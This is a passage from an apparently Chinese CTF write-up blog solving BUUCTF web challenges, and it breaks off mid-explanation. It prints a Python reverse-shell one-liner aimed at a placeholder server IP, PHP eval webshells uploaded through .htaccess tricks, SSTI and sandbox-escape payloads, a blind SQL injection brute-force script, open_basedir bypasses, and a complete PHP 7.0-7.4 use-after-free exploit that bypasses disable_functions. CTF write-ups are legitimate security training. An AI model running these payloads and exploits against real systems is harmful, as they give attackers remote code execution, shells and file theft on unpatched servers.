index():\n    return render_template('search.html')\n\n\n@app.route('/page')\ndef page():\n    url = request.args.get(\"url\")\n    try:\n        if not url.lower().startswith(\"file\"):\n            res = urllib.urlopen(url)\n            value = res.read()\n            response = Response(value, mimetype='application/octet-stream')\n            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'\n            return response\n        else:\n            value = \"HACK ERROR!\"\n    except:\n        value = \"SOMETHING WRONG!\"\n    return render_template('search.html', res=value)\n\n\n@app.route('/no_one_know_the_manager')\ndef manager():\n    key = request.args.get(\"key\")\n    print(SECRET_KEY)\n    if key == SECRET_KEY:\n        shell = request.args.get(\"shell\")\n        os.system(shell)\n        res = \"ok\"\n    else:\n        res = \"Wrong Key!\"\n\n    return res\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n\n```\n\n可以看到代码中打开了`/tmp/secret.txt`并且将其中的内容作为SECRET_KEY，所以我们访问到这个文件就行了，尝试直接读取发现失败，那么我们利用proc文件中的fd文件夹，id从1开始尝试，最终可以拿到该文件\n\n```\nurl=/proc/self/fd/3\np3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=\n```\n\n尝试传参，成功，但是命令执行成功后却没有回显，下一步就是反弹shell或者写文件\n\n反弹shell\n\n```\npayload:\nkey=p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=&shell=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"服务器IP喵喵\",监听端口喵喵));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n~~骚操作直接访问/flag下载文件~~\n\n## [SWPUCTF 2018]SimplePHP\n\n查看文件处可以查看页面源码\n\n```php\n//file.php\n<?php \nheader(\"content-type:text/html;charset=utf-8\");  \ninclude 'function.php'; \ninclude 'class.php'; \nini_set('open_basedir','/var/www/html/'); \n$file = $_GET[\"file\"] ? $_GET['file'] : \"\"; \nif(empty($file)) { \n    echo \"<h2>There is no file to show!<h2/>\"; \n} \n$show = new Show(); \nif(file_exists($file)) { \n    $show->source = $file; \n    $show->_show(); \n} else if (!empty($file)){ \n    die('file doesn\\'t exists.'); \n} \n?> \n```\n\n```php\n//class.php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str=new Show;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str['str']=new Test;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params['source']=\"/var/www/html/f1ag.php\";\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\n\n```php\n//function.php\n<?php \n//show_source(__FILE__); \ninclude \"base.php\"; \nheader(\"Content-type: text/html;charset=utf-8\"); \nerror_reporting(0); \nfunction upload_file_do() { \n    global $_FILES; \n    $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; \n    //mkdir(\"upload\",0777); \n    if(file_exists(\"upload/\" . $filename)) { \n        unlink($filename); \n    } \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); \n    echo '<script type=\"text/javascript\">alert(\"上传成功!\");</script>'; \n} \nfunction upload_file() { \n    global $_FILES; \n    if(upload_file_check()) { \n        upload_file_do(); \n    } \n} \nfunction upload_file_check() { \n    global $_FILES; \n    $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); \n    $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); \n    $extension = end($temp); \n    if(empty($extension)) { \n        //echo \"<h4>请选择上传的文件:\" . \"<h4/>\"; \n    } \n    else{ \n        if(in_array($extension,$allowed_types)) { \n            return true; \n        } \n        else { \n            echo '<script type=\"text/javascript\">alert(\"Invalid file!\");</script>'; \n            return false; \n        } \n    } \n} \n?> \n```\n\n反序列化找链子很明显了\n\n```\nC1e4r::__destruct->Show::__toString->Test::__get->Test::get->Test::file_get\n```\n\n构造反序列化\n\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n}\nclass Test\n{\n    public $file;\n    public $params;\n}\n\n$a = new C1e4r();\n$b = new Show();\n$a->str = $b;\n$c = new Test();\n$c->params['source'] = \"/var/www/html/f1ag.php\";//目标文件\n$b->str['str'] = $c;  //触发__get;\n\n\n$phar = new Phar(\"exp.phar\"); //生成phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($a); //触发类是C1e4r类\n$phar->addFromString(\"text.txt\", \"test\"); //签名\n$phar->stopBuffering();\n\n?>\n```\n\nphar访问即可\n\n## [红明谷CTF 2021]write_shell\n\n```\nif(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n\tdie('hacker!!!');\n```\n\n看看都过滤了啥\n\n空格，下划线，php，分号，~，^，+，eval，花括号\n\n首先是php标签绕过，有短标签\n\n```\n<?=`命令`?>\n<?echo\"1\"?>\n<% echo\"1\";%>\n```\n\n使用第一个来执行命令，然后就是空格，用制表符%09代替，根目录读取即可\n\n```\npayload:data=<?=`cat%09/flllllll1112222222lag`?>\n```\n\n## [HarekazeCTF2019]encode_and_encode\n\n```php\n<?php\nerror_reporting(0);\n\nif (isset($_GET['source'])) {\n  show_source(__FILE__);\n  exit();\n}\n\nfunction is_valid($str) {\n  $banword = [\n    // no path traversal\n    '\\.\\.',\n    // no stream wrapper\n    '(php|file|glob|data|tp|zip|zlib|phar):',\n    // no data exfiltration\n    'flag'\n  ];\n  $regexp = '/' . implode('|', $banword) . '/i';\n  if (preg_match($regexp, $str)) {\n    return false;\n  }\n  return true;\n}\n\n$body = file_get_contents('php://input');\n$json = json_decode($body, true);\n\nif (is_valid($body) && isset($json) && isset($json['page'])) {\n  $page = $json['page'];\n  $content = file_get_contents($page);\n  if (!$content || !is_valid($content)) {\n    $content = \"<p>not found</p>\\n\";\n  }\n} else {\n  $content = '<p>invalid request</p>';\n}\n\n// no data exfiltration!!!\n$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);\necho json_encode(['content' => $content]);\n```\n\n我真绕不过去啊，wp\n\n> json字符转译，json会将utf-8编码的字符自动转为原始字符\n\n这就好办了，直接将想读取内容中的flag进行utf-8编码即可，又因为下面对匹配flag的字符串进行了过滤，所以使用伪协议读取\n\n```\npayload:\nPOST\n{\"page\":\"\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067\"}\n```\n\n## [RootersCTF2019]I_<3_Flask\n\nSSTI很明显了，就是这个传参不好找，用个脚本Arjun用来爆参数的\n\n```\nname={{url_for.__globals__[\"os\"].popen('cat flag.txt').read()}}\n```\n\n## [NCTF2019]SQLi\n\n贴心的提示，ban的可真多\n\n```\n$black_list = \"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\'|=| |in|<|>|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i\";\n\n\nIf $_POST['passwd'] === admin's password,Then you will get the flag;\n```\n\n所有的注释都没了，PHP版本又<5.3.4，使用00截断来裁切后面语句，构造payload\n\n```mysql\nusername=\\&passwd=||(passwd/**/regexp/**/\"^y\");%00\n构造出的语句就是\nselect * from users where username='\\' and passwd='||(passwd/**/regexp/**/\"^w\");%00'\n```\n\n```python\nimport requests\nimport time\nfrom urllib import parse\nurl=\"http://9ae4f74d-f7fe-4d73-8116-90698fc3d9d0.node4.buuoj.cn:81/index.php\"\nname=\"qwertyuiopasdfghjklzxcvbnm_}{0123456789\"\nflag=\"\"\nfor i in range(1,100):\n    for j in name:\n        tmp=flag+j\n        data={'username':'\\\\',\n            'passwd':f\"||(passwd/**/regexp/**/\\\"^{tmp}\\\");{parse.unquote('%00')}\"\n        }\n        co=requests.post(url=url,data=data).status_code\n        if co==404:\n            flag=tmp\n            print(j,end=\"\")\n#you_will_never_know7788990\n```\n\n脚本拿到password，再随便写一个除admin之外的user就行\n\n## [SUCTF 2019]EasyWeb\n\n```php\n<?php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n\n$hhh = @$_GET['_'];\n\nif (!$hhh){\n    highlight_file(__FILE__);\n}\n\nif(strlen($hhh)>18){\n    die('One inch long, one inch strong!');\n}\n\nif ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) )\n    die('Try something else!');\n\n$character_type = count_chars($hhh, 3);\nif(strlen($character_type)>12) die(\"Almost there!\");\n\neval($hhh);\n?>\n```\n\n看代码，应该是让我们执行`get_the_flag`函数再上传文件getshell\n\n首先是[正则绕过](https://blog.csdn.net/mochu7777777/article/details/104631142)，使用异或绕过\n\n```\n?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\n```\n\n下一步就是走文件内容过滤绕过了\n\n首先过了文件带ph后缀，然后检查文件中有没有<?，最后通过`exif_imagetype`看看是不是图片\n\n所有php类型文件想都不要想了，用.htaccess，但是如果直接添加幻数头会导致整个文件不被解析，所以新知识来辣\n\n> exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。\n>\n> **用法:**\n>\n> ```\n> int exif_imagetype( string $filename )\n> ```\n>\n> **参数：**该函数接受单个参数$filename，该参数保存图像的名称或URL。\n>\n> **返回值：**此函数返回与IMAGETYPE常量之一相对应的整数，如下所示：\n>\n> - IMAGETYPE_GIF(1)\n> - IMAGETYPE_JPEG(2)\n> - IMAGETYPE_PNG(3)\n> - IMAGETYPE_SWF(4)\n> - IMAGETYPE_PSD(5)\n> - IMAGETYPE_BMP(6)\n> - IMAGETYPE_TIFF_II(7)\n> - IMAGETYPE_TIFF_MM(8)\n> - IMAGETYPE_JPC(9)\n> - IMAGETYPE_JP2(10)\n> - IMAGETYPE_JPX(11)\n> - IMAGETYPE_JB2(12)\n> - IMAGETYPE_SWC(13)\n> - IMAGETYPE_IFF(14)\n> - IMAGETYPE_WBMP(15)\n> - IMAGETYPE_XBM(16)\n> - IMAGETYPE_ICO(17)\n> - IMAGETYPE_WEBP(18)\n\n只有当文件内容不属于以上任何一种图片类型的时候才会返回FALSE\n\n而在.htaccess中有两个注释符号\n\n```\n\\x00\n#\n```\n\n恰巧在图片中就有两种类型的图片是有这样开头的内容的\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09 23.51.41.png)\n\n> \\x00\\x00\\x85\\x85 只能放在文件开头位置\n\n> \\#define width 1337\n> \\#define height 1337\n> 可以放在文件任意位置\n\n注意好这个就可以上传成功.htaccess文件啦\n\n下面想想木马如何构造，由于对内容中的标签<?进行了过滤，所以是不能使用任何已知的短标签绕过方法进行绕过的，并且在这个版本的PHP中，类似于`<script language=\"php\">`这样的标签也是不生效的，骚操作来了，使用php伪协议用base64绕过，构造内容时在.htaccess中添加伪协议，最终构造出的shell和.htaccess文件如下\n\n```\n.htaccess\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n```\n\n```python\nimport requests\nimport base64\nhta=b'''\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n'''\nhta={'file':('.htaccess',hta,\"image/png\")}\nurl=\"http://42c1f3d3-4023-4a55-822e-532aa2640e28.node4.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\"\nres=requests.post(url=url,files=hta).text\nprint(res)\nshell = b\"GIF89aaa\" + base64.b64encode(b\"<?php eval($_REQUEST['kkk']);?>\")\nshe={'file':('kk.kkk',shell,\"image/png\")}\nres=requests.post(url=url,files=she).text\nprint(res)\n```\n\n上传并访问，成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10 00.09.32.png)\n\n可以看到禁用了巨多的函数，~~其实这里搜索flag就能直接拿到flag了~~，不能执行系统命令，open_basedir又被限制了，尝试[绕过](https://xz.aliyun.com/t/4720)\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));\n```\n\n然后拿flag\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/THis_Is_tHe_F14g');\n```\n\n## [NPUCTF2020]ezinclude\n\n首先看源码提示，提示了pass内容，再看响应头中的Hash，直接传入，跳转flflflflag.php看内容中有个include，读取一把源码\n\n```php\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n```\n\n过滤了data，input，zip\n\n新知识\n\n> 可以利用\n>\n> php://filter/string.strip_tags\n>\n> 导致php崩溃，同时可上传文件保存在/tmp目录来上传木马。\n>\n> 利用条件：\n>\n> - php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复\n> - php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复\n> - php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n> - 可以获取文件名\n> - 源代码将GET参数进行文件包含\n\n构造python脚本\n\n```python\nimport requests\nurl = \"http://eecf8a4a-cb71-40a6-9ff8-6e21849084dd.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\nphpfile = \"<?php phpinfo(); ?>\"\nfiledata = {\n    \"file\":phpfile\n}\nbak = requests.post(url=url, files=filedata)\nprint(bak.text)\n```\n\n此时实例崩溃重启，但是/tmp中的内容依然保存，访问dir.php（目录扫描扫出来的）查看tmp中的内容，发现刚上传的文件，使用include包含后搜索flag拿到flag\n\n## [CISCN2019 华东南赛区]Double Secret\n\n进去访问/secret\n\n```\nTell me your secret.I will encrypt it so others can't see\n```\n\n传参数secret，输点乱七八糟的让它报错，看源码\n\n```python\n    if(secret==None):\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n    rc=rc4_Modified.RC4(\"HereIsTreasure\")   #解密\n    deS=rc.do_crypt(secret)\n    a=render_template_string(safe(deS))\n    if 'ciscn' in a.lower():\n        return 'flag detected!'\n    return a\n```\n\n就是对传入的secret进行RC4编码后再模版渲染\n\n偷一个师傅的脚本\n\n```python\nimport base64\nfrom urllib.parse import quote\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4加密主函数\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))\n    # print(\"原来的 s 盒：%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"混乱后的 s 盒：%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    # print(\"调用加密程序成功。\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    cipher = \"\".join(res)\n    print(\"%s\" %quote(cipher))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\nrc4_main(\"HereIsTreasure\",\"{{lipsum.__globals__.__builtins__.eval(\\\"__import__('os').popen('cat /flag.txt').read()\\\")}}\")\n```\n\n传入喵喵喵\n\n## [GYCTF2020]EasyThinking\n\n看这个题目怕不是ThinkPHP，随便搞一个不存在的目录，发现确实是ThinkPHP V6.0的一个session处任意文件写入漏洞\n\n> 大概就是在./runtime/session/目录下写入一个名为sess_SESSIONID的文件，内容是传入的参数内容\n\n那么在搜索处构造木马`<?php eval($_POST[a]);?>`\n\n然后访问`/runtime/session/sess_d62297dbd2f3523b5b66a5036c3f.php`\n\nban了一堆函数，找`disable_functions`绕过poc\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable \n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\npwn(\"ls /\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n?>\n```\n\n把命令改为/readflag并且使用蚁剑把poc上传并访问，成功拿到flag\n\n## [HFCTF2020]JustEscape\n\n首页提示了可能不是php哦\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10 01.09.27.png)\n\n看wp说是node.js~~本人完全没有接触过~~\n\n测试使用Error().stack函数，发现确实是node.js，是VM2沙箱逃逸，[现成poc](https://github.com/patriksimek/vm2/issues/225)直接使用\n\n```js\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = '(' + function(){\n    TypeError[`${`${`prototyp`}e`}`].get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n}+')()';\ntry{\n    console.log(new VM().run(untrusted));\n}catch(x){\n    console.log(x);\n}\n```\n\n但是这题有关键字过滤，在这使用javascript的模版文字绕过，如\n\n```\nprototype变成`${`${`prototyp`}e`}`\n```\n\n最终payload\n\n```js\n(function (){\n    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();\n    }\n})()\n```\n\n## [BJDCTF2020]EzPHP\n\n看源码，base32解码后访问\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0); \n\n$file = \"1nD3x.php\";\n$shana = $_GET['shana'];\n$passwd = $_GET['passwd'];\n$arg = '';\n$code = '';\n\necho \"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>\";\n\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n\n\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n} ?>\nThis is a very simple challenge and if you solve it I will give you a flag. Good Luck!\nAqua is the cutest five-year-old child in the world! Isn't it ?\n```\n\n就是绕呗\n\n**P1**\n\n`$_SERVER[\"QUERY_STRING\"] `中是?后的内容，在直接读取时并不会进行url解码，但是在使用$_GET访问某一参数的时候会进行URL解码，在这里我们只需要对内容进行URL编码即可\n\n**P2**\n\n换行绕过\n\n**P3**\n\n在`$_REQUEST`中，POST的优先级大于GET传入的参量，所以我们再在POST中重新传一次同名参量就行\n\n**P4**\n\n伪协议绕过，记得URL编码\n\n**P5**\n\nSHA1强比较绕过，类似md5，用数组即可\n\n**P6**\n\n新知识：create_function()\n\n> create_function()注入原理：\n>\n> create_function()函数有两个参数`$args`和`$code`，用于创建一个lambda样式的函数，首先可以用create_function()创建一个简单函数\n\n```php\n<?php\n$afunc = create_function('$a, $b','return ($a+$b);');\necho $afunc(1,2);\n//输出3\n?>\n```\n\n> 而本题的$code('', $arg); //此处存在create_function()注入中可以通过控制$arg来进行代码注入\n> 首先保证传入的$code为create_funtion，\n> 